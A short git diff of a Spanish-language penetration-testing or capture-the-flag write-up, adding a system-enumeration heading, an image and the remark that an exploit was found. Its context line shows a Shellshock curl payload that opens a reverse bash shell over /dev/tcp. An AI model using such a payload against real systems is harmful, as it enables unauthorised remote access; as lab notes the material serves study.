@@ -47,6 +47,10 @@ curl -A "() { :; }; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp
 ![[Pasted image 20240224220415.png]]
 parece que no funciona esta id_rsa
 
+### Enumeracion del sistema
+
+![[Pasted image 20240224224512.png]]
+tenemos un exploit 
 ###### vamos a sobre escribir el path debido a que el actual parece estar dañado
 ```python
 	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
